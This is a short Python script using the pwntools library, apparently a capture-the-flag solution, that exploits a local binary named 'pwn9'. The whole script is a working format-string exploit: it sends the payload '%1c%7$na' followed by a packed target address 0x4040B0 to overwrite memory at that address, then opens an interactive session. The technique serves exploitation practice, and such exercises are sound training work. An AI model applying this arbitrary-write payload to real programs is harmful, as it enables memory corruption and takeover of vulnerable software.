from pwn import *

context(log_level='debug')

# 本地测试
p = process('./pwn9')
target = 0x4040B0

payload = b"%1c%7$na" + p64(target)

p.sendline(payload)

print(p.recvall())

p.interactive()